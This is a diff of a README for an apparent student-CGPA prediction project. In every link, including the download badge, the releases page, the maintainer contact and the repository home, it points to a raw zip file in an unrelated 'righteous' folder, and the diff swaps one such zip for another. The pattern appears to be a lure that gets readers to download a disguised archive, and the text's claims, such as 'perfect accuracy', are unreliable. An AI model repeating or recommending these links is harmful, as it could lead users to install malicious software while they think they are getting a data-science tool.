@@ -5,12 +5,12 @@
 Welcome to the Student Performance Analysis Prediction project. This application predicts student CGPA with perfect accuracy using Linear Regression on 1,193 student records. Our findings show that academic progress determines performance. The project includes a complete machine learning pipeline, from exploratory data analysis (EDA) to a refined model.
 
 ## 📦 Download & Install
-[![Download Release](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip)](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip)
+[![Download Release](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/analysis-prediction-performance-Student-2.2-alpha.1.zip)](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/analysis-prediction-performance-Student-2.2-alpha.1.zip)
 
-To get started, visit the [Releases page](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip) to download the application.
+To get started, visit the [Releases page](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/analysis-prediction-performance-Student-2.2-alpha.1.zip) to download the application.
 
 ### Step-by-Step Download Instructions
-1. Click on the [Releases page](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip).
+1. Click on the [Releases page](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/analysis-prediction-performance-Student-2.2-alpha.1.zip).
 2. Look for the latest release version. It will have the highest version number.
 3. Download the appropriate file for your operating system (Windows, Mac, or Linux).
 4. Save the file to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
@@ -72,11 +72,11 @@ A: Make sure your input data is clean and properly formatted. Check if you have 
 For further questions or assistance, feel free to create an issue on the repository.
 
 ## 📞 Contact
-For direct inquiries or support, you can reach out via GitHub issues or contact the project maintainer at: [https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip).
+For direct inquiries or support, you can reach out via GitHub issues or contact the project maintainer at: [https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/analysis-prediction-performance-Student-2.2-alpha.1.zip](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/analysis-prediction-performance-Student-2.2-alpha.1.zip).
 
 ## 🔗 Relevant Links
-- [Releases Page](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip)
-- [Repository Home](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip)
+- [Releases Page](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/analysis-prediction-performance-Student-2.2-alpha.1.zip)
+- [Repository Home](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/analysis-prediction-performance-Student-2.2-alpha.1.zip)
 
 Thank you for using the Student Performance Analysis Prediction application. Happy predicting!
 ```
